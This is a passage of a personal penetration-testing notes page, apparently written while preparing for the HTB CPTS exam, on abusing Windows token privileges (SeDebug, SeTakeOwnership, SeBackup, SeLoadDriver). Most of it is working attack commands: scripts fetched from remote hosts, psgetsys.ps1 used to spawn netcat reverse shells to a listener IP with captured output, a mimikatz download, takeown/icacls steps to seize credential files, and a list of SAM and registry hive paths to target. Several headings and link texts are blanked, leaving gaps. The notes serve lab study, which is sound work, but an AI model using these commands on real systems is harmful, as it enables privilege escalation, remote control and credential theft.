+<h2 id="restricted-access-tokens">Restricted Access Tokens:</h2>
+<ul>
+<li>These are modified tokens with controlled privileges, created under conditions like to limit privileges based on user group membership or specific privileges granted.</li>
+</ul>
+<h2 id="a65346"><del>Enumerating Windows Privileges</del>:</h2>
+<ul>
+<li>
+<p><strong>Amazing Suite of Tools</strong>: For Privilege Debugging and investigation</p>
+<ul>
+<li><a href="https://github.com/daem0nc0re/PrivFu/tree/main">https://github.com/daem0nc0re/PrivFu/tree/main</a></li>
+</ul>
+</li>
+<li>
+<p><strong>Priv</strong>:</p>
+<ul>
+<li><code>Command</code>: whoami /priv</li>
+<li><del>Notes</del>:
+<ul>
+<li>Some rights are only available to admins.</li>
+<li>See <a href="#disabled-privileges">Disabled Privileges Activation</a> for privs listed as <code>Disabled</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="ba3154"><del>Attacking Windows Privileges</del>:</h2>
+<ul>
+<li><strong>Exploiting</strong> <a href="#semachineaccountprivilege">SeMachineAccountPrivilege</a>:
+<ul>
+<li>See</li>
+</ul>
+</li>
+</ul>
+<h3 id="activate-disabled-privileges--org1d6aa6b">Activate <a href="#disabled-privileges">Disabled Privileges</a>:</h3>
+<ul>
+<li>Remember these can be used on to enable disabled privileges.</li>
+</ul>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->__<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<ul>
+<li><del>Use</del> <del>First</del> <em>!!!</em></li>
+</ul>
+<h4 id="then-this-one">: (then this one!)</h4>
+<ul>
+<li>Just copy to host and run, no arguments etc. It will just try and activate all privs in list</li>
+<li><a href="https://github.com/fashionproof/EnableAllTokenPrivs">https://github.com/fashionproof/EnableAllTokenPrivs</a></li>
+<li><a href="https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77">https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77</a></li>
+<li><strong>Enable All Privs</strong>:
+<ul>
+<li><code>Command</code>: curl <a href="https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1">https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1</a></li>
+<li><code>Command</code>: .\EnableAllTokenPrivs.ps1</li>
+<li><del>Note</del>: This should activate all privs.</li>
+</ul>
+</li>
+</ul>
+<h4 id="853ae9">:</h4>
+<ul>
+<li><a href="https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1">https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1</a></li>
+</ul>
+<h4 id="853ae9">:</h4>
+<ul>
+<li><a href="https://www.leeholmes.com/adjusting-token-privileges-in-powershell/">https://www.leeholmes.com/adjusting-token-privileges-in-powershell/</a></li>
+<li>Will try and activate all privs in the <code>ValidateSet</code> list.</li>
+</ul>
+<h3 id="exploiting-seimpersonateprivilege--org5249bab--and-seassignprimarytokenprivilege--org170fdda">Exploiting <a href="#seimpersonateprivilege">SeImpersonatePrivilege</a> &amp; <a href="#seassignprimarytokenprivilege">SeAssignPrimaryTokenPrivilege</a>:</h3>
+<ul>
+<li>:</li>
+<li>:</li>
+<li>:</li>
+</ul>
+<h3 id="exploiting-sedebugprivilege--org09b3fe5">Exploiting <a href="#sedebugprivilege">SeDebugPrivilege</a>:</h3>
+<ul>
+<li><del>USE ME!</del>
+<ul>
+<li>Used on CPTS but this may not lead to actual useful results; once done move onto the below for RCE as <code>NT/Authority</code>:</li>
+</ul>
+</li>
+</ul>
+<h4 id="rce-as-system-via-sedebugprivilege">RCE as System via SeDebugPrivilege: <del>RCE</del>:</h4>
+<ul>
+<li>Privilege Elevation to SYSTEM
+<ul>
+<li><del>The Script has been updated so can be used to execute NC to get rev shell etc</del>:
+<ul>
+<li>Use Easier way (see below)</li>
+</ul>
+</li>
+<li>Launch a .</li>
+<li>Use elevated rights granted via SeDebugPrivilege.</li>
+<li>Alter system behavior to inherit the token of a parent process.</li>
+<li>Impersonate the .</li>
+</ul>
+</li>
+<li><a href="https://decoder.cloud/2018/02/02/getting-system/">https://decoder.cloud/2018/02/02/getting-system/</a></li>
+<li><a href="https://github.com/decoder-it/psgetsystem?tab=readme-ov-file">https://github.com/decoder-it/psgetsystem?tab=readme-ov-file</a></li>
+</ul>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->_<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>Easier Way: <del>Did on CPTS</del></p>
+<ol>
+<li>
+<p><strong>Find a pid that we know runs as NT/Authority</strong>:</p>
+<ul>
+<li><code>Command</code>: get-process</li>
+<li><del>Notes</del>: I just used lsass as I know that runs as NT/Authority</li>
+</ul>
+</li>
+<li>
+<p><strong>Transfer nc over &amp; script over (you know how to do this)</strong>:</p>
+</li>
+<li>
+<p><strong>Run command script</strong>:</p>
+<ul>
+<li><code>Command</code>: . .\psgetsys.ps1</li>
+<li><code>Command</code>: ImpersonateFromParentPid -ppid &lt;parentpid&gt; -command &lt;command to execute&gt; -cmdargs &lt;command arguments&gt;</li>
+<li><del>Example</del>: ImpersonateFromParentPid -ppid 664 -command C:\Users\Public\Downloads\nc.exe -cmdargs &ldquo;172.16.139.10 8989 -e cmd&rdquo;</li>
+<li><del>Example from CPTS</del>:</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\D</span>ownloads&gt; ImpersonateFromParentPid -ppid <span style="color:#ae81ff">664</span> -command C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\D</span>ownloads<span style="color:#ae81ff">\n</span>c.exe -cmdargs <span style="color:#e6db74">&#34;172.16.139.10 8989 -e cmd&#34;</span>
+</span></span><span style="display:flex;"><span>ImpersonateFromParentPid -ppid <span style="color:#ae81ff">664</span> -command C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\D</span>ownloads<span style="color:#ae81ff">\n</span>c.exe -cmdargs <span style="color:#e6db74">&#34;172.16.139.10 8989 -e cmd&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Got Handle <span style="color:#66d9ef">for</span> ppid: <span style="color:#ae81ff">664</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Updated proc attribute list
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\D</span>ownloads<span style="color:#ae81ff">\n</span>c.exe 172.16.139.10 <span style="color:#ae81ff">8989</span> -e cmd...True - pid: <span style="color:#ae81ff">2604</span> - Last error: <span style="color:#ae81ff">0</span></span></span></code></pre></div>
+    
+</div>
+</li>
+</ol>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>Old Way:</p>
+<ol>
+<li>
+<p><strong>Ensure we have the relevant privilges</strong>:</p>
+<ul>
+<li><code>Command</code>: whoami /priv</li>
+</ul>
+</li>
+<li>
+<p><strong>Transfer Script to target</strong>:</p>
+<ul>
+<li>
+<p><code>Command</code>: PowerShell -ExecutionPolicy Bypass -Command &ldquo;&amp; {Invoke-WebRequest -Uri &lsquo;<a href="https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1'">https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1'</a> -OutFile &lsquo;$env:TEMP\psgetsys.ps1&rsquo;}&rdquo;</p>
+</li>
+<li>
+<p><code>Command</code>: PowerShell -ExecutionPolicy Bypass -Command &ldquo;&amp; {Invoke-WebRequest -Uri &lsquo;http://10.10.15.78:80/psgetsys.ps1&rsquo; -OutFile &lsquo;$env:TEMP\psgetsys.ps1&rsquo;}&rdquo;</p>
+</li>
+<li>
+<p>Repo: <a href="https://github.com/decoder-it/psgetsystem">https://github.com/decoder-it/psgetsystem</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Upload Compiled version of NC to the machine</strong>: (If we want a reverse shell)</p>
+<ul>
+<li>:
+<ul>
+<li>Binaries:
+<ul>
+<li><a href="https://github.com/int0x33/nc.exe/">https://github.com/int0x33/nc.exe/</a></li>
+<li><del>Example</del>: PowerShell -ExecutionPolicy Bypass -Command &ldquo;&amp; {Invoke-WebRequest -Uri &lsquo;http://10.10.15.78:80/nc64.exe&rsquo; -OutFile &lsquo;$env:TEMP\nc.exe&rsquo;}&rdquo;</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><!-- raw HTML omitted -->See<!-- raw HTML omitted -->:
+<ul>
+<li><a href="">Windows File Transfers</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Enumerate PID&rsquo;s to impersonate</strong>:</p>
+<ul>
+<li><code>Command</code>: tasklist</li>
+<li><del>Note</del>:
+<ul>
+<li>Run this from privileged shell as we want privileged process to emulate</li>
+<li>We are looking for a process running as SYSTEM such as winlogon.exe etc.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Import Module</strong>:</p>
+<ul>
+<li><code>Command</code>: . .\psgetsys.ps1</li>
+</ul>
+</li>
+<li>
+<p><strong>Execute script</strong>:</p>
+<ul>
+<li>
+<p><!-- raw HTML omitted -->Pop Local Shell (Requires GUI/RDP Access)<!-- raw HTML omitted -->:</p>
+<ul>
+<li><code>Command</code>: ImpersonateFromParentPid -ppid 604 -command &ldquo;C:\Windows\System32\cmd.exe&rdquo;</li>
+</ul>
+</li>
+<li>
+<p><!-- raw HTML omitted -->Launch Reverse Shell<!-- raw HTML omitted -->:</p>
+<ul>
+<li><code>Command</code>: ImpersonateFromParentPid -ppid &lt;parentpid&gt; -command &ldquo;C:\&lt;Location&gt;\nc.exe 10.10.14.3 8443&rdquo; -cmdargs &quot; -e C:\Windows\system32\cmd.exe &lt;aIP&gt; &lt;aPort&gt;&rdquo;</li>
+<li><del>Example</del>: ImpersonateFromParentPid -ppid 604 -command &ldquo;C:\Users\jordan\Desktop\nc.exe&rdquo; -cmdargs &quot; -e C:\Windows\System32\cmd.exe 10.10.15.78 9993&quot;</li>
+<li><del>Notes</del>:
+<ul>
+<li>Verified and works.</li>
+<li>We have to pass our arguments after launching our intial exe</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Then</strong> <strong>to grab more creds etc</strong>.</p>
+</li>
+</ol>
+<p>wget <a href="http://172.16.139.10:9000/mimikatz.exe">http://172.16.139.10:9000/mimikatz.exe</a> -o mimikatz.exe</p>
+</li>
+</ul>
+<h3 id="exploiting-setakeownershipprivilege--orge9f7456">Exploiting <a href="#setakeownershipprivilege">SeTakeOwnershipPrivilege</a>:</h3>
+<ul>
+<li><code>SeTakeOwnershipPrivilege</code> grants a user the ability to take ownership of any &ldquo;,&rdquo; meaning:
+<ul>
+<li>Active Directory objects</li>
+<li>NTFS files/folders</li>
+<li>Printers</li>
+<li>Registry keys</li>
+<li>Services and processes.</li>
+</ul>
+</li>
+<li>This privilege assigns rights over an object, meaning the user can change the owner within the object&rsquo;s .</li>
+<li>Administrators are assigned this privilege by default.</li>
+</ul>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->_<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<ul>
+<li>Good to use on these files + any kdbx, creds,password,pass files etc:</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>c:\inetpub\wwwwroot\web.config
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">%</span>WINDIR%\repair\sam
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">%</span>WINDIR%\repair\system
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">%</span>WINDIR%\repair\software, <span style="color:#66d9ef">%</span>WINDIR%\repair\security
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">%</span>WINDIR%\system32\config\SecEvent.Evt
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">%</span>WINDIR%\system32\config\<span style="color:#66d9ef">default</span>.sav
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">%</span>WINDIR%\system32\config\security.sav
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">%</span>WINDIR%\system32\config\software.sav
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">%</span>WINDIR%\system32\config\system.sav</span></span></code></pre></div>
+    
+</div>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->_<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<ol>
+<li>
+<p><strong>Check Current Privs</strong>:</p>
+<ul>
+<li><code>Command</code>: whoami /priv</li>
+<li><del>Note</del> If <code>SeTakeOwnershipPrivilege</code> is disabled then use techniques in <a href="#activate-disabled-privileges--org1d6aa6b">Activate Disabled Privileges:</a></li>
+</ul>
+</li>
+<li>
+<p><strong>Choose a target file/object we want to take ownership of</strong>:</p>
+<ul>
+<li>This will probably have been found prior to this step, or taken from the list at the end.
+<ul>
+<li>This is a file/object we want to take ownership of.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Get information about target file</strong>:</p>
+<ul>
+<li><!-- raw HTML omitted -->File Information<!-- raw HTML omitted -->:
+<ul>
+<li><code>Command</code>: Get-ChildItem -Path &lsquo;C:\&lt;Path&gt;\&lt;To&gt;\&lt;file&gt;.txt&rsquo; | Select Fullname,LastWriteTime,Attributes,@{Name=&ldquo;Owner&rdquo;;Expression={ (Get-Acl $_.FullName).Owner }}</li>
+<li><del>Note</del>: If the owner is not displayed once we run the above it most likely means we do not have the required information to view the objects details.
+<ul>
+<li>If that&rsquo;s the case we should enumerate the folder it is contained in as we will most likely get more information that way.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><!-- raw HTML omitted -->Containing Folder information<!-- raw HTML omitted -->:
+<ul>
+<li><code>Command</code>: cmd /c dir /q &lsquo;C:\&lt;Path&gt;\&lt;To&gt;\&lt;Folder&gt;&rsquo;</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Use windows</strong> <strong>to change file ownership</strong>:</p>
+<ul>
+<li><code>Command</code>: takeown /f &lsquo;C:\&lt;Path&gt;\&lt;To&gt;\&lt;File&gt;&rsquo;</li>
+</ul>
+</li>
+<li>
+<p><strong>Confirm Ownership has changed</strong>:</p>
+<ul>
+<li><code>Command</code>: Get-ChildItem -Path &lsquo;C:\&lt;Path&gt;\&lt;To&gt;\&lt;file&gt;.txt&rsquo; | Select Fullname,LastWriteTime,Attributes,@{Name=&ldquo;Owner&rdquo;;Expression={ (Get-Acl $_.FullName).Owner }}</li>
+<li><del>Note</del>: This should now show us as the new owner!</li>
+</ul>
+</li>
+<li>
+<p><strong>Modify the file&rsquo;s</strong> <a href="/posts/20240405141322-ad_access_control_list_acls/">ACL</a> <strong>using</strong> :</p>
+<ul>
+<li>We still might not be able to view the file still due to ACL&rsquo;s so we will need to modify it to ensure we can read the contents.
+<ul>
+<li><code>Command</code>: icacls &lsquo;C:\&lt;Path&gt;\&lt;To&gt;\&lt;File&gt;&rsquo; /grant &lt;userName&gt;:F</li>
+<li><del>Example</del>: icacls &lsquo;C:\Department Shares\Private\IT\cred.txt&rsquo; /grant htb-student:F</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>We should now be able to read the file</strong>:</p>
+</li>
+</ol>
+<h3 id="exploiting-sebackupprivilege--org6c67be4--and-serestoreprivilege--org6b8db47">Exploiting <a href="#sebackupprivilege">SeBackupPrivilege</a> &amp; <a href="#serestoreprivilege">SeRestorePrivilege</a>:</h3>
+<ul>
+<li>See <a href="">Attacking using the Backup Operators Group:</a>
+<ul>
+<li>Lots of different ways to exploit SAM &amp; NTDS.dit</li>
+</ul>
+</li>
+<li><a href="">Copying NTDS.dit database using SeBackupPrivilegePOCExploit:</a></li>
+<li></li>
+<li><a href="">Copying Confidential Files Using Backup Operators Group &amp; SeBackupPrivilegePOCExploit:</a></li>
+</ul>
+<h3 id="exploiting-seloaddriverprivilege--org4c7e104">Exploiting <a href="#seloaddriverprivilege">SeLoadDriverPrivilege</a>:</h3>
+<ul>
+<li>See <a href="">Attacking using the Print Operators Group</a> as being part of the <a href="">Print Operators Group:</a> provides this privilege by default.</li>
+<li>If we control an account that does not have this privilege listed, but we are in the <code>Print Operators Group</code> we can activate it see:
+<ul>
+<li>Check if running from elevated shell shows it listed (GUI required) or use to bypass and see if it is there.</li>
+</ul>
+</li>
+</ul>
+<h2 id="defending-windows-privilege-abuse"><code>Defending Windows Privilege Abuse</code>:</h2>
+<ul>
+<li><a href="https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e">https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e</a>
+<ul>
+<li>Comprehensive guide.</li>
+</ul>
+</li>
+<li><a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4672">https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4672</a></li>
+</ul>
+
+            
+        </div>
+    </article>
+
+        </main>
+
+        <footer class="footer">
+    <div class="footer-left">
+        <ul class="social">
+            
+                <li>All Rights Reserved ®.</li>
+            
+
+            
+                <li>Bloodstiller</li>
+            
+
+            
+                
+            
+                
+            
+                
+                    <li>
+                        
+                            <a href="https://github.com/bloodstiller" target="_blank">
+                                <i class="bi-github"></i>
+                            </a>
+                        
+
+                    </li>
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+        </ul>
+    </div>
+
+    <div class="footer-right">
+        <ul class="control status clearfix">
+            
+                <li>
+                    
+                        Word Count:
+                        2684
+                    
+                </li>
+            
+
+            
+            
+
+            
+                <li>en</li>
+            
+
+            
+                <li>
+                    <a href="https://gohugo.io" class="btn" target="_blank"
+                        >Hugo: 0.135.0</a
+                    >
+                </li>
+            
+
+            
+                <li>
+                    <a
+                        href="https://github.com/JingWangTW/dark-theme-editor"
+                        class="btn"
+                        target="_blank"
+                        >Theme: dark-theme-editor</a
+                    >
+                </li>
+            
+
+            
+                <li>
+                    
+                        Last modified: &nbsp;
+                        <time>
+                            Jan 01 0001 00:00:00
+                        </time>
+                    
+                </li>
+            
+
+            
+                <li title="">
+                    
+                </li>
+            
+        </ul>
+    </div>
+</footer>
+
+    </body>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
+            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/custom.e55ae031ca7d8c1e9bde9a72058dd382e3de5ff9b7df41d6d0e4ccb82ff9962e74b4865412dc15db16e5f16012d5cf9e2330b9826a3a36d5a272077f70e1341b.js"
+            integrity="sha512-5VrgMcp9jB6b3ppyBY3TguPeX/m330HW0OTMuC/5li50tIZUEtwV2xbl8WAS1c&#43;eIzC5gmo6NtWicgd/cOE0Gw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
+            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
+            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />
+
+
+
+
+</html>
